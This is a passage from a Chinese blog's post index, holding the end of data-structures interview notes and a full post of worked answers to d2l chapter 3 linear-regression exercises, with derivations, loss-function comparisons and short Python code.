S(n)&#x3D;O(g(n))<br>$$</p><p>一个程序在执行时除需要存储空间来存放本身所用的指令、常数、变量和输入数据外，还需要一些对数据进行操作的工作单元和存储一些为实现计算所需信息的辅助空间。</p><p>若输入数据所占空间只取决于问题本身，和算法无关，则只需分析除输入和程序之外的额外空间。</p><p>算法原地工作是指算法所需的辅助空间为常量，即 $O(1)$。</p><hr><h1 id="3-数的逻辑结构"><a href="#3-数的逻辑结构" class="headerlink" title="3 数的逻辑结构"></a>3 数的逻辑结构</h1><p>数的逻辑结构指的是数据元素之间逻辑关系，与数的存储结构无关，是独立于计算机的，以下是分类图。</p><p><img src="/2024/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E7%BB%AA%E8%AE%BA/image_k20gL6hZ0g.png"></p><hr><h1 id="4-数的存储结构"><a href="#4-数的存储结构" class="headerlink" title="4 数的存储结构"></a>4 数的存储结构</h1><p>存储结构是指数据结构在计算机中的表示，也称物理结构，主要有以下4种：</p><ol><li><p><strong>顺序存储</strong>：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。</p><p>优点是可以实现随机存取，每个元素占用最少的存储空间；</p><p>缺点是只能使用相邻的一整块存储单元，因此可能产生较多的外部碎片。</p></li><li><p><strong>链式存储</strong>：不要求逻辑上相邻的元素在物理位置上也相邻，借助指示元素存储地址的指针来表示元素之间的逻辑关系。</p><p>优点是不会出现碎片现象，能充分利用所有存储单元；</p><p>缺点是每个元素因存储指针而占用额外的存储空间，且只能实现顺序存取。</p></li><li><p><strong>索引存储</strong>：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。</p><p>优点是检索速度快；</p><p>缺点是附加的索引表额外占用存储空间。另外，增加和删除数据时也要修改索引表，因而会花费较多的时间。</p></li><li><p><strong>散列存储</strong>：根据元素的关键字直接计算出该元素的存储地址，又称哈希（Hash）存储。</p><p>优点是检索、增加和删除结点的操作都很快；</p><p>缺点是若散列函数不好，则可能出现元素存储单元的冲突，而解决冲突会增加时间和空间开销。</p></li></ol><hr><h1 id="5-用循环比递归的效率高吗？"><a href="#5-用循环比递归的效率高吗？" class="headerlink" title="5 用循环比递归的效率高吗？"></a>5 用循环比递归的效率高吗？</h1><p>循环和递归两者是可以互换的，不能决定性的说循环的效率比递归高。</p><p>递归的优点是：代码简洁清晰，容易检查正确性；缺点是：当递归调用的次数较多时，要增加额外的堆栈处理，有可能产生堆栈溢出的情况，对执行效率有一定的影响。</p><p>循环的优点是：结构简单，速度快；缺点是：它并不能解决全部问题，有的问题适合于用递归来解决不适合用循环。</p><hr><h1 id="6-贪心算法和动态规划以及分治法的区别？"><a href="#6-贪心算法和动态规划以及分治法的区别？" class="headerlink" title="6 贪心算法和动态规划以及分治法的区别？"></a>6 贪心算法和动态规划以及分治法的区别？</h1><p><strong>贪心算法</strong>顾名思义就是做出在当前看来是最好的结果，它不从整体上加以考虑，也就是局部最优解。</p><ul><li>贪心算法从上往下，从顶部一步一步最优，得到最后的结果，它不能保证全局最优解，与贪心策略的选择有关。</li></ul><p><strong>动态规划</strong>是把问题分解成子问题，这些子问题可能有重复，可以记录下前面子问题的结果防止重复计算。动态规划解决子问题，前一个子问题的解对后一个子问题产生一定的影响。在求解子问题的过程中保留哪些有可能得到最优的局部解，丢弃其他局部解，直到解决最后一个问题时也就是初始问题的解。</p><ul><li>动态规划是从下到上，一步一步找到全局最优解。（各子问题重叠）</li></ul><p><strong>分治法</strong>（divide-and-conquer）：将原问题划分成n个规模较小而结构与原问题相似的子问题；递归地解决这些子问题，然后再合并其结果，就得到原问题的解。（各子问题独立）</p><p>分治模式在每一层递归上都有三个步骤：</p><ol><li>分解（Divide）：将原问题分解成一系列子问题</li><li>解决（Conquer）：递归地解各个子问题。若子问题足够小，则直接求解</li><li>合并（Combine）：将子问题的结果合并成原问题的解，例如归并排序</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d2l学习笔记1：第3章线性回归课后题</title>
      <link href="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/"/>
      <url>/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="1-线性回归"><a href="#1-线性回归" class="headerlink" title="1 线性回归"></a>1 线性回归</h1><h2 id="1-1-问题1"><a href="#1-1-问题1" class="headerlink" title="1.1 问题1"></a>1.1 问题1</h2><p>假设我们有一些数据$x_1, \ldots, x_n \in \mathbb{R}$。我们的目标是找到一个常数$b$，使得最小化$\sum_i (x_i - b)^2$。</p><ol><li>找到最优值$b$的解析解。</li><li>这个问题及其解与正态分布有什么关系?</li></ol><h3 id="1-1-1-第一问"><a href="#1-1-1-第一问" class="headerlink" title="1.1.1 第一问"></a>1.1.1 第一问</h3><p>线性回归的解可以用一个公式简单地表示，这类解叫做<strong>解析解</strong>。</p><p>$$<br>\begin{array}{c}\underset{b}{\operatorname{argmin}} \sum_{i&#x3D;1}^{n}\left(x_{i}-b\right)^{2} \ \Rightarrow \frac{\partial \sum_{i&#x3D;1}^{n}\left(x_{i}-b\right)^{2}}{\partial b}&#x3D;0 \ \Rightarrow \sum_{i&#x3D;1}^{n}\left(x_{i}-b\right)&#x3D;0 \ \Rightarrow \sum_{i&#x3D;1}^{n} x_{i}&#x3D;n b \ \Rightarrow b&#x3D;\frac{\sum_{i&#x3D;1}^{n} x_{i}}{n}\end{array}<br>$$</p><p>就相当于对目标表达式进行求偏导，这里求出来b就是均值。</p><h3 id="1-1-2-第二问"><a href="#1-1-2-第二问" class="headerlink" title="1.1.2 第二问"></a>1.1.2 第二问</h3><p>均方误差损失函数可以用于线性回归的一个原因是：假设观测中包含噪声，其中遭声服从正态分布，噪声正态分布如下式：令$x_{i}&#x3D;b+\epsilon$，其中，$\epsilon \sim \mathcal{N}\left(0, \sigma^{2}\right)$</p><p>$$<br>P\left(x_{i} \mid b\right)&#x3D;\frac{1}{\sqrt{2 \pi \sigma^{2}}} \exp \left(-\frac{1}{2 \sigma^{2}}\left(x_{i}-b\right)^{2}\right)<br>$$</p><p>$$<br>P(x \mid b)&#x3D;\prod_{i&#x3D;1}^{n} p\left(x_{i} \mid b\right)<br>$$</p><p>$$<br>-\log P(x \mid b)&#x3D;\frac{n}{2} \log \left(2 \pi \sigma^{2}\right)+\sum_{i&#x3D;1}^{n} \frac{1}{2 \sigma^{2}}\left(x_{i}-b\right)^{2}<br>$$</p><p>此时求$\operatorname{argmax}_{b} P(x \mid b)$：</p><p>$$<br>\operatorname{argmin}<em>{b}-\log P(x \mid b)&#x3D;\operatorname{argmin}</em>{b} \sum_{i&#x3D;1}^{n}\left(x_{i}-b\right)^{2}<br>$$</p><p>也即求上一问题的解析解。因此，在高斯噪声的假设下，最小化均方误差等价于对线性模型的极大似然估计。</p><h2 id="1-2-问题2"><a href="#1-2-问题2" class="headerlink" title="1.2 问题2"></a>1.2 问题2</h2><p>推导出使用平方误差的线性回归优化问题的解析解。为了简化问题，可以忽略偏置$b$（我们可以通过向$\mathbf X$添加所有值为1的一列来做到这一点）。</p><ol><li>用矩阵和向量表示法写出优化问题（将所有数据视为单个矩阵，将所有目标值视为单个向量）。</li><li>计算损失对$w$的梯度。</li><li>通过将梯度设为0、求解矩阵方程来找到解析解。</li><li>什么时候可能比使用随机梯度下降更好？这种方法何时会失效？</li></ol><h3 id="1-2-1-第一问"><a href="#1-2-1-第一问" class="headerlink" title="1.2.1 第一问"></a>1.2.1 第一问</h3><p>$$<br>\hat<em>{n, q}&#x3D;{X}</em>{n, d+1} {w}_{d+1, q}<br>$$</p><h3 id="1-2-2-第二问"><a href="#1-2-2-第二问" class="headerlink" title="1.2.2 第二问"></a>1.2.2 第二问</h3><p>$$<br>L&#x3D;\frac{1}{2}({Y}-\hat)^{2}<br>$$</p><p>$$<br>\frac{\partial {L}}{\partial {w}}&#x3D;\frac{\partial \frac{1}{2}({Y}-{X} {w})^{2}}{\partial {w}}&#x3D;({Y}-{X} {w})\left(-{X}^{\top}\right)<br>$$</p><h3 id="1-2-3-第三问"><a href="#1-2-3-第三问" class="headerlink" title="1.2.3 第三问"></a>1.2.3 第三问</h3><p>$$<br>({Y}-{X} {w})\left(-{X}^{\top}\right)&#x3D;0<br>$$</p><p>$$<br>-X^TY+X^TXw&#x3D;0<br>$$</p><p>$$<br>则w^*&#x3D;(X^TX)^{-1}X^TY<br>$$</p><h3 id="1-2-4-第四问"><a href="#1-2-4-第四问" class="headerlink" title="1.2.4 第四问"></a>1.2.4 第四问</h3><p>解析解可能比使用随机梯度下降（<code>SGD</code>）更好的情况包括：</p><ol><li><strong>简单问题</strong>：解析解通常适用于简单的问题，其中目标函数和约束条件很容易求导并求解。在这种情况下，直接计算解析解比使用<code>SGD</code>更高效。</li><li><strong>小规模数据集</strong>：对于小规模的数据集，计算解析解可以很快完成，并且由于数据量较小，解析解的计算开销相对较小。</li><li><strong>显式公式要求</strong>：某些应用场景可能要求得到显式的公式解析解，例如需要解释、推导或证明的问题。</li></ol><p>然而，解析解的方法在以下情况下可能会失效：</p><ol><li><strong>复杂问题</strong>：对于复杂的问题，目标函数和约束条件可能很难求导或求解，或者求解过程可能非常复杂甚至不存在解析解。在这种情况下，使用<code>SGD</code>等数值优化算法可能更适合。</li><li><strong>大规模数据集</strong>：对于大规模数据集，计算解析解的计算复杂度可能非常高，甚至无法完成。在这种情况下，<code>SGD</code>通常更具可行性和可扩展性。</li><li><strong>随机性和噪声</strong>：如果目标函数存在随机性或噪声，并且我们希望在优化过程中考虑到这些因素，那么<code>SGD</code>等迭代方法通常更合适，因为它们可以根据采样的随机梯度进行逐步的调整。</li></ol><p>像线性回归这样的简单问题存在解析解，但并不是所有的问题都存在解析解。</p><p>解析解可以进行很好的数学分析，但解析解对问题的限制很严格，导致它无法广泛应用在深度学习里。</p><h2 id="1-3-问题3"><a href="#1-3-问题3" class="headerlink" title="1.3 问题3"></a>1.3 问题3</h2><p>假定控制附加噪声$\epsilon$的噪声模型是指数分布。也就是说，$p(\epsilon) &#x3D; \frac{1}{2} \exp(-|\epsilon|)$</p><ol><li>写出模型$-\log P(\mathbf y \mid \mathbf X)$下数据的负对数似然。</li><li>请试着写出解析解。</li><li>提出一种随机梯度下降算法来解决这个问题。哪里可能出错？（提示：当我们不断更新参数时，在驻点附近会发生什么情况）请尝试解决这个问题。</li></ol><h3 id="1-3-1-第一问"><a href="#1-3-1-第一问" class="headerlink" title="1.3.1 第一问"></a>1.3.1 第一问</h3><p>$$<br>令 \mathbf{y}&#x3D;\mathbf{w}^T{\mathbf{X}}+b+\epsilon<br>$$</p><p>$$<br>P(\mathbf{y} \mid \mathbf{X})&#x3D;p(\epsilon)&#x3D;\frac{1}{2} \exp \left(-\left|\mathbf{y}-\mathbf{w}^{\top} \mathbf{X}-b\right|\right)<br>$$</p><p>$$<br>&#x3D;\prod_{i&#x3D;1}^{n} \frac{1}{2} \exp \left(-\mid \mathbf{y}_{i}\right. -\mathbf{w}^{\top} \mathbf{X}-b|)<br>$$</p><p>$$<br>&#x3D;\frac{1}{2}^{n} \exp \left(-\sum_{i&#x3D;1}^{n}\left|\mathbf{y}<em>{i}-\mathbf{w}^{\top} \mathbf{X}</em>{i}-b\right|\right)<br>$$</p><p>$$<br>-\log P(\mathbf{y} \mid \mathbf{X})&#x3D;n \log 2+\sum_{i&#x3D;1}^{n} \mid \mathbf{y}<em>{i}-\mathbf{w}^{\top} \mathbf{X}</em>{i}-b|<br>$$</p><h3 id="1-3-2-第二问"><a href="#1-3-2-第二问" class="headerlink" title="1.3.2 第二问"></a>1.3.2 第二问</h3><p>忽略b，有以下：</p><p>$$<br>L&#x3D;|\mathbf{Y}-\mathbf{X} \mathbf{w}|&#x3D;\operatorname{sgn}(\mathbf{Y}-\mathbf{X} \mathbf{w})(\mathbf{Y}-\mathbf{X} \mathbf{w})<br>$$</p><p>$$<br>\frac{\partial \mathbf{L}}{\partial \mathbf{w}}&#x3D;\operatorname{sgn}(\mathbf{Y}-\mathbf{X w})\left(-\mathbf{X}^{\top}\right)<br>$$</p><p>可见$\frac{\partial \mathbf{L}}{\partial \mathbf{w}}&#x3D;0$时，无解析解，即绝对值函数在驻点处不可导。</p><h3 id="1-3-3-第三问"><a href="#1-3-3-第三问" class="headerlink" title="1.3.3 第三问"></a>1.3.3 第三问</h3><p>一种随机梯度下降（<code>SGD</code>）算法来解决绝对值函数在驻点不可导的问题是使用<strong>次梯度</strong>方法。次梯度是绝对值函数的导数的一个推广，它在驻点（即零点）处可以多个解。以下是一种可能的次梯度下降算法：</p><ol><li><p>初始化参数 b 和学习率 α</p></li><li><p>选择一个样本$x_i$</p></li><li><p>计算绝对值函数 f 的次梯度 g</p><p>当$x_i &gt; b$时，$g &#x3D; 1$</p><p>当$x_i &lt; b$时，$g &#x3D; -1$</p><p>当$x_i &#x3D; b$时，$g \in [-1,1]$，可以随机选择一个值</p></li><li><p>更新参数 b ：$b &#x3D; b - α * g$</p></li><li><p>重复步骤2~4直至达到停止条件（例如达到最大迭代次数或梯度变化很小）</p></li></ol><hr><h1 id="2-线性回归的从零实现"><a href="#2-线性回归的从零实现" class="headerlink" title="2 线性回归的从零实现"></a>2 线性回归的从零实现</h1><h2 id="2-1-问题1"><a href="#2-1-问题1" class="headerlink" title="2.1 问题1"></a>2.1 问题1</h2><blockquote><p>问题：如果我们将权重初始化为零，会发生什么。算法仍然有效吗？</p></blockquote><p>在线性回归中，由于只有一层神经网络，且<code>SGD</code>过程中，梯度求导后结果与参数本身无关，而是取决于输入$w$和$b$，因此，可以将权重初始化为0，算法仍然有效。</p><p>但是，在多层神经网络中，如果将权重初始化为0，或者其他统一的常量，会导致后面迭代的权重更新相同，并且神经网络中的激活单元的值相同，输出的梯度也相等，导致对称性问题，无法进行独立学习，找到最优解。</p><p>参数初始化需要满足几个基本条件，包括：</p><ul><li><strong>激活值的方差一致性</strong>：不同层的激活值应该有相似的方差，以防止梯度消失或梯度爆炸。</li><li><strong>梯度方差的一致性</strong>：不同层对状态Z的梯度的方差也应该保持一致，以保证反向传播时梯度的稳定性。</li></ul><p>满足这些条件的初始化方法可以有效地帮助神经网络更好地学习。</p><p><strong>常见的参数初始化策略</strong>：</p><ul><li><strong>零初始化</strong>：这是最简单的初始化策略，将所有权重和偏置设置为0。然而，如前所述，这种策略会导致网络无法学习。</li><li><strong>随机初始化</strong>：将权重随机初始化为小的随机数，偏置初始化为0。这种策略可以打破网络的对称性，使得网络可以学习不同的特征。</li><li><strong>Xavier初始化（Glorot初始化）</strong>：这是一种基于激活值方差一致性的初始化策略，旨在使得每一层的激活值具有相同的方差。Xavier初始化适用于sigmoid和tanh等激活函数。</li><li><strong>He初始化</strong>：也称为Kaiming初始化，适用于ReLU及其变体等非线性激活函数。它的基本思想是根据激活函数的特性调整权重的初始化分布，使得每一层的激活值具有相同的方差。</li></ul><h2 id="2-2-问题2"><a href="#2-2-问题2" class="headerlink" title="2.2 问题2"></a>2.2 问题2</h2><blockquote><p>问题：假设试图为电压和电流的关系建立一个模型。自动微分可以用来学习模型的参数吗?</p></blockquote><p>将电压和电流的关系建立模型为$U&#x3D;Iw+b$，转化为线性回归问题，可用自动微分学习模型的参数并更新，逐步优化模型使得损失函数最小化，并使得模型能够更好地拟合电压和电流之间的关系。</p><h2 id="2-3-问题3"><a href="#2-3-问题3" class="headerlink" title="2.3 问题3"></a>2.3 问题3</h2><blockquote><p>问题：计算二阶导数时可能会遇到什么问题？这些问题可以如何解决？</p></blockquote><p>二阶导数包含了更多关于损失函数曲率的信息，因此在某些情况下，计算二阶导数可能有助于更快地收敛和更准确的更新。然而，由于计算复杂度较高，通常在实际应用中很少使用。</p><p>以下是计算二阶导数时可能会遇到的问题，以及可能的解决方法：</p><ol><li><p><strong>计算复杂度高</strong>： 计算Hessian矩阵需要更多的计算资源和时间，尤其在大规模数据和复杂模型上。</p><p>解决方法： 通常可以使用近似方法来估计二阶导数，例如L-BFGS（Limited-memory Broyden-Fletcher-Goldfarb-Shanno）等优化算法。这些方法在一定程度上降低了计算成本，同时仍能提供较好的优化效果。</p></li><li><p><strong>存储需求大</strong>： Hessian矩阵的存储需求随着参数数量的增加而增加，可能导致内存不足的问题。</p><p>解决方法： 使用一些高效的矩阵近似方法，如块对角近似（block-diagonal approximation）或采样Hessian近似，来减少存储需求。</p></li><li><p><strong>数值不稳定性</strong>： 在计算Hessian矩阵时，可能会遇到数值不稳定性，导致数值误差累积，影响优化结果。</p><p>解决方法： 使用数值稳定的计算方法，例如通过添加小的正则化项来避免矩阵的奇异性。另外，选择合适的优化算法和学习率调度也可以帮助稳定优化过程。</p></li><li><p><strong>局部极小值和鞍点</strong>： 在高维空间中，存在许多局部极小值和鞍点，这可能导致Hessian矩阵的谱值较小，使得计算二阶导数的结果不稳定。</p><p>解决方法： 使用正则化技术、随机性优化方法（如随机梯度牛顿法）或基于自适应学习率的算法，可以帮助逃离局部极小值和鞍点。</p></li></ol><p>总之，虽然计算二阶导数在优化中具有一定的潜在优势，但在实际应用中，由于上述问题和计算成本，往往更常使用一阶优化方法（如<code>SGD</code>、<code>Adam</code>等）及其变种。选择优化方法时，需要根据具体问题的特点来权衡二阶信息带来的优势和计算成本。</p><h2 id="2-4-问题4"><a href="#2-4-问题4" class="headerlink" title="2.4 问题4"></a>2.4 问题4</h2><blockquote><p>问题：尝试使用不同的学习率，观察损失函数值下降的快慢</p></blockquote><p>学习率越小，损失函数值下降越慢，反之亦然；</p><p>但当学习率过高时，损失函数值将出现<code>inf</code>和<code>nan</code>。</p><h2 id="2-5-问题5"><a href="#2-5-问题5" class="headerlink" title="2.5 问题5"></a>2.5 问题5</h2><blockquote><p>问题：如果样本个数不能被批量大小整除，<code>data_iter</code>函数的行为会有什么变化？</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_iter</span>(<span class="params">batch_size, features, labels</span>):</span><br><span class="line">    num_examples = <span class="built_in">len</span>(features)</span><br><span class="line">    indices = <span class="built_in">list</span>(<span class="built_in">range</span>(num_examples))</span><br><span class="line">    <span class="comment"># 打乱顺序</span></span><br><span class="line">    random.shuffle(indices)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, num_examples, batch_size):</span><br><span class="line">        batch_indices = torch.tensor(</span><br><span class="line">            indices[i: <span class="built_in">min</span>(i + batch_size, num_examples)]</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">yield</span> features[batch_indices], labels[batch_indices]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当num_examples不能被batch_size整除，data_iter函数的行为会有以下变化：</p><p>最后一个批次的样本数量会小于batch_size：在for循环中，当i递增到最后一个不完整的批次时，min(i+batch_size, num_examples)会返回一个小于batch_size的值，这意味着最后一个批次的样本数量会少于batch_size。</p><hr><h1 id="3-线性回归的简洁实现"><a href="#3-线性回归的简洁实现" class="headerlink" title="3 线性回归的简洁实现"></a>3 线性回归的简洁实现</h1><h2 id="3-1-问题1"><a href="#3-1-问题1" class="headerlink" title="3.1 问题1"></a>3.1 问题1</h2><blockquote><p>问题：如果将小批量的总损失替换为小批量损失的平均值，需要如何更改学习率？</p></blockquote><p>感觉问题是不是问反了，应该是将平均值替换为总损失的话，应将学习率除以$batch_size$。</p><p>$$<br>\mathbf{w}<em>{t}&#x3D;\mathbf{w}</em>{t-1}-\eta \frac{\partial l}{\partial \mathbf{w}_{t-1}}<br>$$</p><h2 id="3-2-问题2"><a href="#3-2-问题2" class="headerlink" title="3.2 问题2"></a>3.2 问题2</h2><blockquote><p>问题：查看深度学习框架文档，它们提供了哪些损失函数和初始化方法？用Huber损失代替原损失，即</p></blockquote><p>$$<br>l(y,y’) &#x3D; \begin{cases}|y-y’| -\frac{\sigma}{2} &amp; \text{ if } |y-y’| &gt; \sigma \ \frac{1}{2 \sigma} (y-y’)^2 &amp; \text{ 其它情况}\end{cases}<br>$$</p><p>损失函数除了<code>MSE</code>（均方误差），还有交叉熵（常用于概率）等共19种损失函数。</p><h3 id="3-2-1-MSE"><a href="#3-2-1-MSE" class="headerlink" title="3.2.1 MSE"></a>3.2.1 MSE</h3><p>均方误差指的就是模型预测值$f(x)$与样本真实值$y$之间<strong>距离平方的平均值</strong>。其公式如下所示：</p><p>$$<br>M S E&#x3D;\frac{1}{n} \sum_{i&#x3D;1}^{n}\left(y_{i}-f\left(x_{i}\right)\right)^{2}<br>$$</p><p>为了简化讨论，忽略下标$i,n&#x3D;1$，以$f(x) $为横坐标，MSE为纵坐标，绘制其损失函数的图形：</p><p><img src="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/image_4OdYso00X-.png"></p><p>MSE 曲线的特点是光滑连续、可导，便于使用梯度下降算法，是比较常用的一种损失函数。而且，MSE 随着误差的减小，梯度也在减小，这有利于函数的收敛，即使固定学习因子，函数也能较快取得最小值。</p><p>平方误差有个特性，就是当 $y_i$ 与$f(x_i)$的差值大于 1 时，会增大其误差；当 $y_i$ 与$f(x_i)$的差值小于 1 时，会减小其误差。这是由平方的特性决定的。也就是说， MSE 会对误差较大（&gt;1）的情况给予更大的惩罚，对误差较小（&lt;1）的情况给予更小的惩罚。从训练的角度来看，模型会更加偏向于惩罚较大的点，赋予其更大的权重。</p><p>如果样本中存在离群点，MSE 会给离群点赋予更高的权重，但是却是以牺牲其他正常数据点的预测效果为代价，这最终会降低模型的整体性能。看一下使用 MSE 解决含有离群点的回归模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.linspace(<span class="number">1</span>, <span class="number">20</span>, <span class="number">40</span>)</span><br><span class="line">y = x + [np.random.choice(<span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">y[-<span class="number">5</span>:] -= <span class="number">8</span></span><br><span class="line">X = np.vstack((np.ones_like(x),x))    <span class="comment"># 引入常数项 1</span></span><br><span class="line">m = X.shape[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 参数初始化</span></span><br><span class="line">W = np.zeros((<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 迭代训练 </span></span><br><span class="line">num_iter = <span class="number">20</span></span><br><span class="line">lr = <span class="number">0.01</span></span><br><span class="line">J = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_iter):</span><br><span class="line">   y_pred = W.dot(X)</span><br><span class="line">   loss = <span class="number">1</span>/(<span class="number">2</span>*m) * np.<span class="built_in">sum</span>((y-y_pred)**<span class="number">2</span>)</span><br><span class="line">   J.append(loss)</span><br><span class="line">   W = W + lr * <span class="number">1</span>/m * (y-y_pred).dot(X.T)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 作图</span></span><br><span class="line">y1 = W[<span class="number">0</span>,<span class="number">0</span>] + W[<span class="number">0</span>,<span class="number">1</span>]*<span class="number">1</span></span><br><span class="line">y2 = W[<span class="number">0</span>,<span class="number">0</span>] + W[<span class="number">0</span>,<span class="number">1</span>]*<span class="number">20</span></span><br><span class="line">plt.scatter(x, y)</span><br><span class="line">plt.plot([<span class="number">1</span>,<span class="number">20</span>],[y1,y2])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>拟合结果如下图所示：</p><p><img src="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/image_hwxYBubcPv.png"></p><p>可见，使用 MSE 损失函数，受离群点的影响较大，虽然样本中只有 5 个离群点，但是拟合的直线还是比较偏向于离群点。这往往是我们不希望看到的。</p><h3 id="3-2-2-MAE"><a href="#3-2-2-MAE" class="headerlink" title="3.2.2 MAE"></a>3.2.2 MAE</h3><p>平均绝对误差指的就是模型预测值$f(x)$与样本真实值$y$之间<strong>距离的平均值</strong>。其公式如下所示：</p><p>$$<br>MAE&#x3D;\frac{1}{n} \sum_{i&#x3D;1}^{n}\left|y_{i}-f\left(x_{i}\right)\right|<br>$$</p><p>为了简化讨论，忽略下标$i,n&#x3D;1$，以$f(x) $为横坐标，MAE 为纵坐标，绘制其损失函数的图形：</p><p><img src="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/image_EPc6pGgFHP.png"></p><p>直观上来看，MAE 的曲线呈 V 字型，连续但在$y&#x3D;0$处不可导，计算机求解导数比较困难。而且 MAE 大部分情况下梯度都是相等的，这意味着即使对于小的损失值，其梯度也是大的。<strong>不利于函数的收敛和模型的学习</strong>。</p><p>值得一提的是，MAE 相比 MSE 有个优点就是 MAE 对离群点不那么敏感，更有包容性。因为 MAE 计算的是误差 y-f(x) 的绝对值，无论是 y-f(x)&gt;1 还是 y-f(x)&lt;1，没有平方项的作用，惩罚力度都是一样的，所占权重一样。针对 MSE 中的例子，我们来使用 MAE 进行求解，看下拟合直线有什么不同。</p><p><img src="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/image_1X6LCBd8Ss.png"></p><h3 id="3-2-3-Huber-Loss"><a href="#3-2-3-Huber-Loss" class="headerlink" title="3.2.3 Huber Loss"></a>3.2.3 Huber Loss</h3><p>Huber Loss 是对二者的综合，包含了一个超参数 δ。δ 值的大小决定了 Huber Loss 对 MSE 和 MAE 的侧重性，当$|y−f(x)| ≤ δ$时，变为 MSE；当$  |y−f(x)| &gt; δ  $时，则变成类似于 MAE，因此 Huber Loss 同时具备了 MSE 和 MAE 的优点，减小了对离群点的敏感度问题，实现了<strong>处处可导</strong>的功能。</p><p>$$<br>L_{\delta}(y, f(x))&#x3D;\left{\begin{array}{ll}\frac{1}{2}(y-f(x))^{2}, &amp; |y-f(x)| \leq \delta \ \delta|y-f(x)|-\frac{1}{2} \delta^{2}, &amp; |y-f(x)|&gt;\delta\end{array}\right.<br>$$</p><p>通常来说，超参数 δ 可以通过交叉验证选取最佳值。下面，分别取 δ &#x3D; 0.1、δ &#x3D; 1，绘制相应的 Huber Loss，如下图所示：</p><p><img src="/2024/07/31/d2l%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E7%AC%AC3%E7%AB%A0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E8%AF%BE%E5%90%8E%E9%A2%98/image_uCnU3iZDOD.png"></p><p>Huber Loss 在 $|y−f(x)| &gt; δ$ 时，梯度一直近似为 δ，能够保证模型以一个较快的速度更新参数。当 $|y−f(x)| ≤ δ$ 时，梯度逐渐减小，能够保证模型更精确地得到全局最优值。因此，Huber Loss 同时具备了前两种损失函数的优点。</p><h2 id="3-3-问题3"><a href="#3-3-问题3" class="headerlink" title="3.3 问题3"></a>3.3 问题3</h2><blockquote><p>问题：如何访问线性回归的梯度？</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(net[<span class="number">0</span>].weight.grad, net[<span class="number">0</span>].bias.grad)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> d2l </category>
          
      </categories>
      
      
        <tags>
            
            <tag> d2l </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
